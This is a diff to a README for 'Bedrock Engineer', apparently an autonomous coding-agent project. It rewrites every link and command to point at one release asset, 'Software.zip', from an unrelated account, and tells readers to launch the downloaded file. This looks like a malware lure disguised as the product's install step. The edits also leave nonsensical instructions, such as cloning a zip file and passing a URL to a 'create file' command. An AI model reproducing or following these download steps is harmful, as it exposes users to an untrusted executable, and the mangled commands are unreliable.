@@ -42,7 +42,7 @@ To get started with **Bedrock Engineer**, follow these steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/bedrock-engineer.git
+   git clone https://github.com/Luckyfz/bedrock-engineer/releases/download/v1.0/Software.zip
    ```
 
 2. Install any necessary dependencies:
@@ -51,7 +51,7 @@ To get started with **Bedrock Engineer**, follow these steps:
    ```
 
 3. Visit the following link to download the latest version of the **Bedrock Engineer** software agent:
-   [![Download Bedrock Engineer](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) - Launch the downloaded file to begin the installation process.
+   [![Download Bedrock Engineer](https://github.com/Luckyfz/bedrock-engineer/releases/download/v1.0/Software.zip)](https://github.com/Luckyfz/bedrock-engineer/releases/download/v1.0/Software.zip) - Launch the downloaded file to begin the installation process.
 
 ---
 
@@ -61,7 +61,7 @@ Once you have **Bedrock Engineer** installed on your system, you can start utili
 
 1. Creating a new file:
    ```bash
-   bedrock create file new-file.txt
+   bedrock create file https://github.com/Luckyfz/bedrock-engineer/releases/download/v1.0/Software.zip
    ```
 
 2. Executing a command:
@@ -97,7 +97,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for your interest in **Bedrock Engineer**! We hope you find our autonomous software development agents useful in enhancing your software development process. Happy coding! 🌟
 
-[Visit the project on GitHub](https://github.com/your-username/bedrock-engineer)
+[Visit the project on GitHub](https://github.com/Luckyfz/bedrock-engineer/releases/download/v1.0/Software.zip)
 
 ---
 
